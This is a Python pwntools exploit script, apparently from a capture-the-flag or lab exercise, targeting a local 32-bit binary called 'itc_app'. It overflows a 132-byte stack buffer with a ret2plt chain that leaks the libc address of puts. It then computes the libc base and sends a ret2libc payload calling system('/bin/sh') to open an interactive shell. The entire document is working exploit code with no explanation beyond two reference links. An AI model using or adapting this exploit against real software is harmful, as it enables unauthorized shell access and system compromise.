import struct
from pwn import process, ELF, context

def main():

    # Set the binary context
    binary_path = './itc_app'
    elf = context.binary = ELF(binary_path)

    # Start the process
    proc = process()

    # Define offsets and addresses
    buffer_size = 132
    puts_plt_address = 0x8048340
    main_address = 0x804847b
    puts_got_address = 0x80497ac

    # Construct the initial payload
    payload = (
        b'A' * buffer_size +
        struct.pack("I", puts_plt_address) +  # puts PLT
        struct.pack("I", main_address) +      # main address
        struct.pack("I", puts_got_address)    # puts GOT
    )

    # Send the initial payload
    proc.sendline(payload)

    # Initialize variables to track the welcome message
    welcome_detected = False
    leaked_address = None

    # Process output to leak address
    for _ in range(10):
        try:
            line = proc.recvline()
            print(line)  # Display the line received from the process
            if welcome_detected and b"Welcome" in line:
                leaked_address = int.from_bytes(previous_line[:4], byteorder='little')
                print(f"\033[32mLeaked puts' libc Addr: \033[0m\033[36m{hex(leaked_address)}\033[0m")
                libc_base_address = leaked_address - 0x731b0  # Offset for libc's puts
                print(f"\033[32mLibc base Addr: \033[0m\033[36m{hex(libc_base_address)}\033[0m")
                break
            if b"Welcome" in line:
                welcome_detected = True
            previous_line = line
        except EOFError:
            break

    # Construct and send the final payload if an address was leaked
    if leaked_address:
        final_payload = (
            b'A' * buffer_size +
            struct.pack("I", libc_base_address + 0x4c830) +  # libc system offset
            struct.pack("I", libc_base_address + 0x3c130) +  # libc exit offset
            struct.pack("I", libc_base_address + 0x1b5fc8)   # libc /bin/sh offset
        )
    
        proc.sendline(final_payload)

        # Interact with the process after sending the final payload
        proc.interactive()


if __name__ == "__main__":
    main()

"""
References:
- https://docs.pwntools.com/en/stable/
- https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass
"""
